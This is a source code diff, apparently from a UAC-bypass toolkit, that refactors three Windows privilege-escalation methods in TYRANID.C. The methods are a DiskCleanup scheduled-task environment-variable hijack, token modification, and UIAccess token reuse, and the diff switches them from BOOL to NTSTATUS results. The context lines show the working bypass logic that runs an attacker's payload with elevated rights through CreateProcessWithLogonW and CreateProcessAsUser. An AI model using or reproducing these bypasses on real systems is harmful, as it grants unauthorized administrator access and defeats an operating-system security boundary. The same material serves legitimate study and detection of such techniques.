@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.15
+*  VERSION:     3.17
 *
-*  DATE:        15 Feb 2019
+*  DATE:        18 Feb 2019
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -35,17 +35,18 @@
 * Warning: this method works with AlwaysNotify UAC level.
 *
 */
-BOOL ucmDiskCleanupEnvironmentVariable(
+NTSTATUS ucmDiskCleanupEnvironmentVariable(
     _In_ LPWSTR lpszPayload
 )
 {
-    BOOL    bResult = FALSE, bCond = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     WCHAR   szEnvVariable[MAX_PATH * 2];
 
     do {
 
         if (_strlen(lpszPayload) > MAX_PATH)
-            return FALSE;
+            return STATUS_INVALID_PARAMETER;
 
         //
         // Add quotes.
@@ -64,16 +65,17 @@ BOOL ucmDiskCleanupEnvironmentVariable(
         //
         // Run trigger task.
         //
-        bResult = supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD);
+        if (supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD))
+            MethodResult = STATUS_SUCCESS;
 
         //
         // Cleaup our env.variable.
         //
         supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
 
-    } while (bCond);
+    } while (FALSE);
 
-    return bResult;
+    return MethodResult;
 }
 
 /*
@@ -86,14 +88,14 @@ BOOL ucmDiskCleanupEnvironmentVariable(
 * Fixed in Windows 10 RS5
 *
 */
-BOOL ucmTokenModification(
+NTSTATUS ucmTokenModification(
     _In_ LPWSTR lpszPayload,
     _In_ BOOL fUseCommandLine
 )
 {
-    BOOL bCond = FALSE, bResult = FALSE, bSelfRun = FALSE;
+    BOOL bSelfRun = FALSE;
     ULONG dummy;
-    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    NTSTATUS Status = STATUS_ACCESS_DENIED;
     HANDLE hTargetProcess = NULL;
     HANDLE hProcessToken = NULL, hDupToken = NULL, hLuaToken = NULL, hImpToken = NULL;
 
@@ -277,7 +279,7 @@ BOOL ucmTokenModification(
             lpCommandLine = NULL;
         }
 
-        bResult = CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
+        if (CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
             LOGON_NETCREDENTIALS_ONLY,
             lpApplicationName,
             lpCommandLine,
@@ -285,11 +287,11 @@ BOOL ucmTokenModification(
             NULL,
             NULL,
             &si,
-            &pi);
-
-        if (bResult) {
+            &pi)) 
+        {
             if (pi.hThread) CloseHandle(pi.hThread);
             if (pi.hProcess) CloseHandle(pi.hProcess);
+            Status = STATUS_SUCCESS;
         }
 
         //
@@ -302,7 +304,7 @@ BOOL ucmTokenModification(
             (PVOID)&hImpToken,
             sizeof(HANDLE));
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hImpToken) NtClose(hImpToken);
     if (hProcessToken) NtClose(hProcessToken);
@@ -315,8 +317,7 @@ BOOL ucmTokenModification(
     if (hTargetProcess) NtClose(hTargetProcess);
     if (pIntegritySid) RtlFreeSid(pIntegritySid);
 
-    RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
-    return bResult;
+    return Status;
 }
 
 /*
@@ -379,14 +380,12 @@ BOOL ucmxTokenModUIAccessMethodInitPhase(
 * Obtain token from UIAccess application, modify it and reuse for UAC bypass.
 *
 */
-BOOL ucmTokenModUIAccessMethod(
+NTSTATUS ucmTokenModUIAccessMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
-{
-    BOOL bResult = FALSE;
-
-    NTSTATUS Status;
+{  
+    NTSTATUS Status = STATUS_ACCESS_DENIED;
     LPWSTR lpszPayload = NULL;
     PSID pIntegritySid = NULL;
     HANDLE hDupToken = NULL, hProcessToken = NULL;
@@ -426,7 +425,7 @@ BOOL ucmTokenModUIAccessMethod(
         // Open process token.
         //
         Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
-        if (!NT_SUCCESS(Status))
+        if (!NT_SUCCESS(Status)) 
             break;
 
         //
@@ -483,24 +482,25 @@ BOOL ucmTokenModUIAccessMethod(
         else
             lpszPayload = g_ctx->szOptionalParameter;
 
-        bResult = CreateProcessAsUser(hDupToken, 
+        if (CreateProcessAsUser(hDupToken,
             szBuffer,    //application
             lpszPayload, //command line
-            NULL, 
-            NULL, 
+            NULL,
+            NULL,
             FALSE,
             CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
-            NULL, 
-            NULL, 
-            &si, 
-            &pi);
-
-        if (bResult) {
+            NULL,
+            NULL,
+            &si,
+            &pi)) 
+        {
             if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                 TerminateProcess(pi.hProcess, (UINT)-1);
 
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
+
+            Status = STATUS_SUCCESS;
         }
 
     } while (FALSE);
@@ -518,5 +518,5 @@ BOOL ucmTokenModUIAccessMethod(
     _strcat(szBuffer, FUBUKI_EXE);
     DeleteFile(szBuffer);
 
-    return bResult;
+    return Status;
 }
